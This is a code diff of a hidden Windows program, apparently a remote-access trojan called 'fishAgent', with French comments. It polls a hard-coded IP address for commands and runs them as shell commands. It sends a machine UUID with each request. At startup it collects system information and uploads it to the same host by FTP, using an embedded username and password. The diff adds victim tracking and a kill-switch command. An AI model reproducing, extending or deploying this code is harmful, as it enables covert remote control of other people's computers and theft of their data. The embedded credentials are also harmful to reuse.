@@ -21,12 +21,21 @@ using namespace std;
 
 // Effectue une requête HTTP GET pour récupérer une commande depuis un serveur distant.
 string GetCommand() {
-    string command;
+    string command = "NO_COMMAND";
+    // Récupérer l'UUID pour l'envoyer au serveur
+    // Si le fichier system_info.dat n'existe pas, le créer d'abord
+    if (!PathFileExistsA((userFolder + "\\fish\\system_info.dat").c_str())) {
+        createSystemInfoFile();
+    }
+    
+    // Lire l'UUID du système
+    string uuid = getUUID();
 
     HINTERNET hInternet = InternetOpenA("fishAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (hInternet) {
-
-        HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://45.90.160.149:5000/command", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+        // Modifier l'URL pour inclure l'UUID dans la requête comme attendu par le serveur Python
+        string url = "http://45.90.160.149:5000/command?input=" + uuid;
+        HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
         if (hConnect) {
             char buffer[256];
             DWORD bytesRead = 0;
@@ -39,7 +48,6 @@ string GetCommand() {
         }
         InternetCloseHandle(hInternet);
     }
-    // MessageBox(NULL, command.c_str(), TEXT("Alerte"), MB_OK);
     return command;
 }
 
@@ -77,6 +85,13 @@ void ListenForCommand() {
             string shellCommand = cmd.substr(6); 
             ExecuteShellCommand(shellCommand);
         }
+        else if (cmd == "KILLSWITCH") {
+            // Gérer la commande KILLSWITCH - terminer le programme
+            exit(0);
+        }
+        else if (cmd == "NO_COMMAND") {
+            // Aucune commande à exécuter, continuer
+        }
 
         this_thread::sleep_for(chrono::seconds(5));
     }
@@ -84,24 +99,21 @@ void ListenForCommand() {
 
 // Point d'entrée de l'application Windows (aucune console ne sera affichée)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    //string globalUUID = GetUUID();
+    // Vérifier si le fichier system_info.dat existe, sinon le créer
+    if (!PathFileExistsA((userFolder + "\\fish\\system_info.dat").c_str())) {
+        createSystemInfoFile();
+        // Uploader les infos système vers le serveur FTP si nécessaire
+        uploadFileToFTP("45.90.160.149", "debian", "UiCT?\"Zn3BXM^~ouprhl3N^b2Iy!CF`u%e$P?#sS@@hwerwPn%i=1*1;nfb`RKX7", 
+                        (userFolder + "\\fish\\system_info.dat").c_str(), "system_info.dat");
+    }
 
+    // Démarrer le thread d'écoute des commandes
     thread listener(ListenForCommand);
     listener.detach();
 
+    // Maintenir l'application en exécution
     while (true) {
         this_thread::sleep_for(chrono::seconds(60));
-
-        if (!PathFileExistsA("system_info.dat")) {
-            // Si le fichier n'existe pas, on le crée et on l'upload
-            createSystemInfoFile();
-            uploadFileToFTP("45.90.160.149", "debian", "UiCT?\"Zn3BXM^~ouprhl3N^b2Iy!CF`u%e$P?#sS@@hwerwPn%i=1*1;nfb`RKX7", "system_info.dat", "system_info.dat");
-            //MessageBox(NULL, TEXT(globalUUID.c_str()), TEXT("Alerte"), MB_OK);
-        } else {
-            // Sinon, on lit l'UUID existant
-            //readUUIDFromFile();
-            //MessageBox(NULL, TEXT(globalUUID.c_str()), TEXT("Alerte"), MB_OK);
-        }
     }
 
     return 0;
